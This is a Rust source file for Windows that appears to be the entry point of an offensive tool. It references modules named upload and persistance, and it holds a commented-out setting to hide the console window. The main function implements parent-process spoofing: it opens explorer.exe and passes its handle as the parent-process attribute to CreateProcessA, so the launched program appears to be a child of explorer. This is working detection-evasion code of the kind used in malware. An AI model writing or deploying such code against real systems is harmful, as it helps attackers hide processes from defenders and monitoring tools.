//#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]

mod upload;
//mod escape;
mod tools;
mod persistance;

use std::fs::File;

use std::io::Read;
use std::string::String;
use std::io::Write;


use std::mem;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
use winapi::um::processthreadsapi::{
    CreateProcessA, InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,PROCESS_INFORMATION,
};
use winapi::um::winbase::STARTUPINFOEXA;
use winapi::um::winnt::{HANDLE, LPSTR};

use sysinfo::{PidExt,Pid, ProcessExt, System, SystemExt};

fn main() {

    let mut my_ppid = std::process::id();
    println!("my pid : {}",my_ppid);
    let s = System::new_all();
    for process in s.processes_by_exact_name("explorer.exe") {
        my_ppid = process.pid().as_u32();
        println!("{} {}", process.pid(), process.name());
    }
    println!("my pid : {}",my_ppid);

    let mut attrsize: SIZE_T = Default::default();
    let mut pi = PROCESS_INFORMATION::default();
    let mut si = STARTUPINFOEXA::default();
    unsafe {
        let mut openproc: HANDLE = OpenProcess(0x02000000, 0, my_ppid); //PPID
    
        InitializeProcThreadAttributeList(null_mut(), 1, 0, &mut attrsize);
        si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attrsize) as _;
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &mut attrsize);
        UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            0 | 0x00020000,
            (&mut openproc) as *mut *mut c_void as *mut c_void,
            mem::size_of::<HANDLE>(),
            null_mut(),
            null_mut(),
        );
        si.StartupInfo.cb = mem::size_of::<STARTUPINFOEXA>() as u32;
        CreateProcessA(
            null_mut(),
            "C:\\temp\\pestudio\\pestudio.exe\0".as_ptr() as LPSTR,
            null_mut(),
            null_mut(),
            0,
            0x00080000,
            null_mut(),
            null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        );
    }

}

